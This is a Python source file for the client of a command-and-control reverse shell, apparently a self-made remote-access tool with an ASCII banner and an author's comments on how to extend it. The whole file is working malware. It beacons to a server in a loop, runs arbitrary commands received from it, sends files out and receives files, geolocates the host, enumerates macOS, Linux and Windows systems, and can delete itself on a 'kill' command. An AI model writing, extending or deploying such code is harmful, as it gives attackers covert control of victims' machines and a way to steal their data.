#!/usr/local/bin/python3



"""
Dear Programmer:
When I wrote this code, only god, and
I knew how it worked.
Now, only god know it!

Therefore, if you are trying to optimize
this routine(add encryption), and it fails (most surely),
please increase this counter as a
warning for the next person(or group):

total weeks wasted here = 4.5

"""



import socket
import os
import sys
import pathlib
import hashlib
import time
import random
import subprocess
import requests
import json
from typing import Optional

SERVER_IP = "127.0.0.1"  # Remote address
PORT = 1234  # Remote port
FORMAT = "utf-8"  # Message encoding format
HEADER_SIZE = 10  # Message header size
MAX_CONSECUTIVE = 5  # Max consecutive connection attempts
SEGMENT_SIZE = 1024  # Segment size when downloading / uploading files
TIMEOUT = 1  # Socket timeout when downloading / uploading files
COOLDOWN = (1, 1)  # Range of time to sleep between consecutive connection attempts (In seconds)
HIBERNATE = (1, 1)  # Range of time to hibernate after reaching maximum retries / Identifying a used port
COMMAND_TIMEOUT = 10  # Time limit for command execution on the client side
DOWNLOADS = pathlib.Path(__file__).parent  # Downloaded files destination path
OS = os.name  # Local operating system
MUTEX = pathlib.Path(__file__).parent.joinpath("mutex")  # Path to mutex containing the current pid of this program
REMOVE_MUTEX = True


CLIENT_ASCII_IMAGE = """
██╗░░░░░███████╗███████╗██╗██╗░██████╗  
██║░░░░░██╔════╝██╔════╝██║╚█║██╔════╝  
██║░░░░░█████╗░░█████╗░░██║░╚╝╚█████╗░  
██║░░░░░██╔══╝░░██╔══╝░░██║░░░░╚═══██╗  
███████╗███████╗██║░░░░░██║░░░██████╔╝  
╚══════╝╚══════╝╚═╝░░░░░╚═╝░░░╚═════╝░  

░█████╗░██████╗░
██╔══██╗╚════██╗
██║░░╚═╝░░███╔═╝
██║░░██╗██╔══╝░░
╚█████╔╝███████╗
░╚════╝░╚══════╝

░█████╗░██╗░░░░░██╗███████╗███╗░░██╗████████╗
██╔══██╗██║░░░░░██║██╔════╝████╗░██║╚══██╔══╝
██║░░╚═╝██║░░░░░██║█████╗░░██╔██╗██║░░░██║░░░
██║░░██╗██║░░░░░██║██╔══╝░░██║╚████║░░░██║░░░
╚█████╔╝███████╗██║███████╗██║░╚███║░░░██║░░░
░╚════╝░╚══════╝╚═╝╚══════╝╚═╝░░╚══╝░░░╚═╝░░░
"""


def get_file_hash(data: list[bytes]) -> str:
    md5 = hashlib.md5()
    for chunk in data:
        md5.update(chunk)
    return md5.hexdigest()


def upload_file(sock: socket.socket, path: str) -> None:
    # Implemented segmentation when reading / sending file data to avoid memory overload
    path = str(pathlib.Path(path).resolve())  # Absolute path (Resolve symlinks)
    try:
        # Read target file in segments
        data = []
        with open(path, "rb") as f:
            chunk = f.read(SEGMENT_SIZE)
            while chunk:
                data.append(chunk)
                chunk = f.read(SEGMENT_SIZE)
        sock.send("1".ljust(HEADER_SIZE).encode(FORMAT))  # Signal: File contents were successfully read

        # Calculate & send file hash, later used for integrity verifications on server side
        md5 = get_file_hash(data)
        sock.send(md5.encode(FORMAT))

        # Send segmented file data
        for segment in data:
            if segment:
                sock.send(segment)
    except (FileNotFoundError, IOError):  # Signal: Error when trying to read from target file
        sock.send("0".ljust(HEADER_SIZE).encode(FORMAT))


def download_file(sock: socket.socket, path: str) -> None:
    # Implemented segmentation when writing / receiving file data to avoid memory overload
    file_name = pathlib.Path(path).name  # File name without the full path
    dst = str(DOWNLOADS.joinpath(file_name))  # Create destination file full path
    original = sock.gettimeout()
    sock.settimeout(TIMEOUT)  # Set requested timeout
    original_md5 = ""
    data = []
    result = ""
    message = ""
    try:
        # Get client side status
        readable_src_file = int(sock.recv(HEADER_SIZE).decode(FORMAT))
        if readable_src_file:  # File was read successfully on client side
            # Get original file hash
            original_md5 = sock.recv(32).decode(FORMAT)

            # Receive segmented file contents and write to destination file
            with open(dst, "wb") as f:
                segment = sock.recv(SEGMENT_SIZE)
                while segment:  # Keep receiving data until timeout
                    f.write(segment)
                    data.append(segment)  # Save written data for hash calculation
                    segment = sock.recv(SEGMENT_SIZE)
        else:  # Error finding / reading file on client side
            result = "0"
            message = "ERROR"
    except socket.timeout:  # Reached timeout, proceed to check file integrity
        # Calculate downloaded file hash
        result_md5 = get_file_hash(data)
        # Integrity verification
        if result_md5 == original_md5:
            # Successful download
            result = "1"
            message = file_name
        else:
            # Timeout reached before completing the download
            result = "0"
            message = "TIMEOUT"
    finally:
        # Send final result and message to the server side
        sock.send(result.ljust(SEGMENT_SIZE).encode(FORMAT))
        sock.send(message.ljust(SEGMENT_SIZE).encode(FORMAT))
        # Reset timeout value
        sock.settimeout(original)


def run_msg(msg: str) -> str:
    # Command execution attempt
    try:
        output = subprocess.run(rf"{msg}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                timeout=COMMAND_TIMEOUT)
        return output.stdout.decode()
    except subprocess.TimeoutExpired as err:
        return str(err)


def send_output(sock: socket.socket, msg: str) -> None:
    # Attempt to change directory
    if msg[:3] == "cd ":
        path = msg[3:]
        try:
            os.chdir(path)
            output = ""  # Send an empty message upon success
        except FileNotFoundError:  # Unrecognized directory specified
            output = f"[!] ERROR: Directory {path} doesn't exist"
    elif msg == "locate":  # Get client's location information
        location_info = get_location_info()
        output = json.dumps(location_info)  # Serialize location information to JSON
    elif msg == "mac-enum":
        system_info = get_mac_system_enumeration(sock)  # Get mac system enumeration information
        output = system_info
    elif msg == "linux-enum":
        system_info = get_linux_system_enumeration(sock)  # Get linux system enumeration information
        output = system_info
    elif msg == "win-enum":
        system_info = get_win_system_enumeration(sock)  # Get windows system enumeration information
        output = system_info
    elif msg == "help":
        menu = help_command()
        output = menu
    else:
        output = run_msg(msg)

    # Send the message to the client
    msg_len = len(output)
    sock.send((f"{msg_len:<{HEADER_SIZE}}" + output).encode(FORMAT))

def recv_msg(sock: socket.socket) -> str:
    try:
        # Only receive the header and extract the message length
        msg_len = int(sock.recv(HEADER_SIZE).decode(FORMAT))
        # Receive & return the message in its entirety
        return sock.recv(msg_len).decode(FORMAT)
    except ValueError:
        return ""

# def send_mac_system_info(sock: socket.socket) -> None:  # supposed to be a function to send data from another function using third function to the server
#     system_info = get_mac_system_enumeration(sock) # but I quickly realized that it is ineffective so I just disabled it with comments
#     send_output(sock, system_info)

def shell(sock: socket.socket) -> None:
    orig = sock.gettimeout()
    sock.settimeout(COMMAND_TIMEOUT)
    try:
        while sock:
            try:
                msg_from_server = recv_msg(sock)
            except socket.timeout:
                continue
            # For certain keywords, run the appropriate action
            if msg_from_server in ["quit", "exit"]:  # Server side connection termination signal
                sock.close()
                break
            if msg_from_server == "kill":  # Server side activity termination signal
                os.remove(sys.argv[0])  # Delete client side script from the target system
                os._exit(0)  # Exit immediately (Do not resolve 'finally' statements)
            elif msg_from_server in ["clear", "bg", "background"]:  # Ignore certain server side keywords
                pass
            elif msg_from_server[:9] == "download ":  # Server side file download signal
                upload_file(sock, msg_from_server[9:])
            elif msg_from_server[:7] == "upload ":  # Server side file upload signal
                download_file(sock, msg_from_server[7:])
            elif msg_from_server:  # Any other command
                send_output(sock, msg_from_server)
    except Exception as e:
        print(f"Error in shell function: {e}")
    finally:
        sock.settimeout(orig)

def establish_connection(sock: socket.socket, consecutive_connections: int) -> int:
    # Connection attempt to server side
    try:
        sock.connect((SERVER_IP, PORT))
        shell(sock)
    except ConnectionError:  # No listener found
        # Count consecutive connection attempts
        if consecutive_connections < MAX_CONSECUTIVE:
            consecutive_connections += 1
            print("sleep 1")
            time.sleep(random.randint(COOLDOWN[0], COOLDOWN[1]))
        else:  # Reached maximum consecutive connections allowed, going to sleep...
            consecutive_connections = 1
            print("hibernate 1")
            time.sleep(random.randint(HIBERNATE[0], HIBERNATE[1]))
    except OSError as err:  # Required port is already in use
        print(f"{err = }")
        time.sleep(random.randint(HIBERNATE[0], HIBERNATE[1]))
    except KeyboardInterrupt:
        pass
    finally:
        return consecutive_connections


def check_process_running(pid: str) -> bool:
    # Check on a Windows based system
    if OS == 'nt':
        try:
            output = subprocess.check_output(f'tasklist /nh /fi "PID eq {pid}"')
            if f"{pid}" in output.decode():
                return True
            return False
        except subprocess.CalledProcessError:
            return False 

    # Check on a Unix baseed system
    else:
        try:
            os.kill(int(pid), 0)
            return True
        except ProcessLookupError:
            return False
        except PermissionError:
            return False


def verify_mutex() -> None:
    global REMOVE_MUTEX
    # Verify this program isn't already running on the local system
    if os.path.isfile(MUTEX):
        # Retrieve PID
        with open(MUTEX, "r") as f:
            pid = f.read()

        # Verify PID is currently running
        if check_process_running(pid):
            print(f"Program already running, aborting...")
            REMOVE_MUTEX = False
            sys.exit()

    # Create new MUTEX
    with open(MUTEX, "w") as f:
        f.write(str(os.getpid()))

# Location retriever
def get_location_info() -> dict:
    try:
        response = requests.get("https://ipinfo.io/json")
        data = response.json()
        location_info = {
            "ip": data.get("ip"),
            "city": data.get("city"),
            "region": data.get("region"),
            "country": data.get("country"),
            "location": data.get("loc"),
            "organization": data.get("org")
        }
        return location_info
    except Exception as e:
        print(f"Error retrieving location information: {e}")
        return {}

# Help menu/manual
def help_command():
    menu = """
    Menu:
    1. exit / quit: Close the server side script.
    2. clear: Clear server side terminal screen.
    3. list: Display all active sessions.
    4. connect -to SESSION_ID: Reattach the specified session.
    5. broadcast COMMAND: Execute a command on all available targets.
    6. background / bg: Background shell and keep the current session active.
    7. quit / exit: Exit shell and close the current session.
    8. clear: Clear server side terminal screen.
    9. download TARGET_FILE_PATH: Download target file from client to server.
    10. upload TARGET_FILE_PATH: Upload target file from server to client.
    11. locate: Shows location of the client
    12. mac-enum: Retrieves system information from macOS client
    13. linux-enum: Retrieves system information from linux/unix-like client
    14. win-enum: Retrieves system information from shindows client
    15. kill: Signal the client side to terminate(delete?) itself, make sure that you have a backup.
    """
    return menu

# macOS enumerator2000
def get_mac_system_enumeration(sock: socket.socket) -> Optional[str]:
    try:
        # Execute shell commands to gather system information
        uname_info = subprocess.check_output(['uname', '-a']).decode('utf-8', 'replace').strip()
        whoami_info = subprocess.check_output(['whoami']).decode('utf-8', 'replace').strip()
        date_info = subprocess.check_output(['date']).decode('utf-8', 'replace').strip()
        uptime_info = subprocess.check_output(['uptime']).decode('utf-8', 'replace').strip()
        system_profiler_soft_info = subprocess.check_output(['system_profiler', 'SPSoftwareDataType']).decode('utf-8', 'replace').strip()
        system_profiler_disp_info = subprocess.check_output(['system_profiler', 'SPDisplaysDataType']).decode('utf-8', 'replace').strip()

        # Combine all information
        system_info = f"{uname_info}\n\n{whoami_info}\n\n{date_info}\n\n{uptime_info}\n\n{system_profiler_soft_info}\n\n{system_profiler_disp_info}"
        return system_info        
    
    except Exception as e:
        # Print the actual exception for debugging purposes
        print(f"Error occurred: {e}")
        return f"Error: {str(e)}"

# Shindows enumerator2000
def get_win_system_enumeration(sock: socket.socket) -> Optional[str]:
    try:
        # Execute shell commands to gather system information
        hostname_info = subprocess.check_output(['hostname']).decode('utf-8', 'replace').strip()
        whoami_info = subprocess.check_output(['whoami']).decode('utf-8', 'replace').strip()
        systeminfo_info = subprocess.check_output(['systeminfo']).decode('utf-8', 'replace').strip()

        # Combine all information
        system_info = f"{hostname_info}\n\n{whoami_info}\n\n{systeminfo_info}"
        return system_info        
    
    except Exception as e:
        # Print the actual exception for debugging purposes
        print(f"Error occurred: {e}")
        return f"Error: {str(e)}"

# Linux enumerator2000
def get_linux_system_enumeration(sock: socket.socket) -> Optional[str]:
    try:
        # Execute shell commands to gather system information
        uname_info = subprocess.check_output(['uname', '-a']).decode('utf-8', 'replace').strip()
        whoami_info = subprocess.check_output(['whoami']).decode('utf-8', 'replace').strip()
        ip_info = subprocess.check_output(['ip', '-a']).decode('utf-8', 'replace').strip()
        id_info = subprocess.check_output(['id']).decode('utf-8', 'replace').strip()
        hostname_info = subprocess.check_output(['hostname']).decode('utf-8', 'replace').strip()
        etc_os_release_info = subprocess.check_output(['cat', '/etc/os-release']).decode('utf-8', 'replace').strip()

        # Combine all information
        system_info = f"{uname_info}\n\n{whoami_info}\n\n{ip_info}\n\n{id_info}\n\n{hostname_info}\n\n{etc_os_release_info}"
        return system_info        
    
    except Exception as e:
        # Print the actual exception for debugging purposes
        print(f"Error occurred: {e}")
        return f"Error: {str(e)}"
    
"""
here you may create your own function/module with desired functionality if you want to have some more features that I cannot imagine,
but I think that this is enough for now. If you want to add something, please do it in the same way as I did it here.

def your_function_name() -> your data type:
    try:
        your function's arguments
        xxxxxxxxxxx
        yyyyyyyyyyy
        zzzzzzzzzzz

        return your_function_name
    except Exception as e:
        print(f"Error retrieving your_function_job information: {e}")
        return {}

    and this below should be put in the 'send_output' function in the manner below:


    elif msg == "your_function_alias":
        xyz = your_function_name()
        output = xyz

P.S. don't forget about shell function in the server, there you can put your message to be sent to the client and later on adjust the client side
so it could execute your desired function

elif command == "your_function_alias": 
    send_msg(sock, "your_function_name")

REMEMBER! first server and only then client!! and thank you for your time

"""

def main() -> None:
    print(CLIENT_ASCII_IMAGE)
    # Verify program isn't already running and create mutex
    verify_mutex()

    # Start program execution
    consecutive_connections = 1
    s = ""
    # Establish client side
    while True:  # 24/7 Beacon attempts once executed
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Enable address reuse
            consecutive_connections = establish_connection(s, consecutive_connections)
        except KeyboardInterrupt:
            pass
        finally:
            if s:
                s.close()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
    finally:
        if REMOVE_MUTEX:
            os.remove(MUTEX)
